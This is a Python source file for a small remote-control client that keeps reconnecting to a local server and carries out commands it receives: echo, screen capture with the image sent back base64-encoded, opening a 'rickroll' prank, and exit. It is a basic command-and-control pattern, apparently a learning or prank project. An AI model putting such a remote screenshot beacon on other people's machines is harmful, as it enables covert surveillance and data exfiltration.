
import socket
import json
import time
import base64
import traceback

from take_screenshot import ScreenshotTaker
from get_rick_roll import RickRoll

SERVER_HOST = "127.0.0.1"
SERVER_PORT = 9323
RETRY_DELAY = 2.0
CONNECT_TIMEOUT = 5.0


class JsonSocket:

    def __init__(self, sock: socket.socket):
        self._sock = sock
        self._fp = sock.makefile("r+", encoding="utf-8", newline="\n")

    def send(self, obj: dict) -> None:
        self._fp.write(json.dumps(obj) + "\n")
        self._fp.flush()

    def recv(self) -> dict:
        line = self._fp.readline()
        if line == "":
            raise ConnectionError("peer closed connection")
        return json.loads(line)

    def close(self) -> None:
        try:
            self._fp.close()
        finally:
            self._sock.close()


class SimpleExecutor:

    def run(self, command: str) -> dict:
        return {"status": "Ok", "echo": command}


class AgentClient:
    def __init__(self, host: str, port: int, retry_delay: float = 2.0):
        self.host = host
        self.port = port
        self.retry_delay = retry_delay
        self.executor = SimpleExecutor()
        self._stopped = False

    def _connect_with_retry(self) -> JsonSocket:
        while not self._stopped:
            try:
                sock = socket.create_connection((self.host, self.port), timeout=CONNECT_TIMEOUT)
                sock.settimeout(None)
                print(f"[agent] connected to {self.host}:{self.port}")
                return JsonSocket(sock)
            except OSError:
                print(f"[agent] server unreachable, retrying in {self.retry_delay}s...")
                time.sleep(self.retry_delay)
        raise ConnectionError("stopped")

    def stop(self) -> None:
        self._stopped = True

    def run(self) -> None:
        try:
            while not self._stopped:
                try:
                    jsock = self._connect_with_retry()
                except ConnectionError:
                    break
                try:
                    while not self._stopped:
                        try:
                            incoming = jsock.recv()
                        except ConnectionError:
                            print("[agent] server disconnected.")
                            break
                        except json.JSONDecodeError:
                            print("[agent] received invalid JSON; ignoring.")
                            continue

                        if not isinstance(incoming, dict):
                            continue

                        mtype = incoming.get("type")
                        if mtype != "command":
                            continue

                        cmd = incoming.get("data", "")
                        if not isinstance(cmd, str):
                            jsock.send({"type": "result", "status": "Error", "stderr": "command not a string"})
                            continue

                        lower = cmd.strip().lower()
                        if lower == "exit":
                            print("[agent] received exit -> shutting down.")
                            jsock.send({"type": "result", "status": "Ok", "echo": "exiting"})
                            self.stop()
                            break

                        if lower.startswith("echo "):
                            payload = cmd[5:]
                            result = {"status": "Ok", "echo": payload}
                            jsock.send({"type": "result", **result})
                            continue

                        if lower == "screenshot":
                            try:
                                taker = ScreenshotTaker()
                                img_bytes = taker.take_screenshot()
                                b64 = base64.b64encode(img_bytes).decode("ascii")
                                jsock.send({"type": "result", "status": "Ok", "screenshot_b64": b64})
                            except Exception as e:
                                tb = traceback.format_exc()
                                jsock.send({"type": "result", "status": "Error", "stderr": str(e), "traceback": tb})
                            continue

                        if lower == "rickroll":
                            try:
                                r = RickRoll()
                                r.get_rick_roll()
                                jsock.send({"type": "result", "status": "Ok", "echo": "rickroll opened"})
                            except Exception as e:
                                tb = traceback.format_exc()
                                jsock.send({"type": "result", "status": "Error", "stderr": str(e), "traceback": tb})
                            continue

                        jsock.send({"type": "result", "status": "Error", "stderr": "unknown command"})
                finally:
                    jsock.close()
                    if not self._stopped:
                        time.sleep(self.retry_delay)
        except KeyboardInterrupt:
            print("\n[agent] interrupted by user.")
        finally:
            print("[agent] exiting.")


if __name__ == "__main__":
    client = AgentClient(SERVER_HOST, SERVER_PORT, RETRY_DELAY)
    client.run()
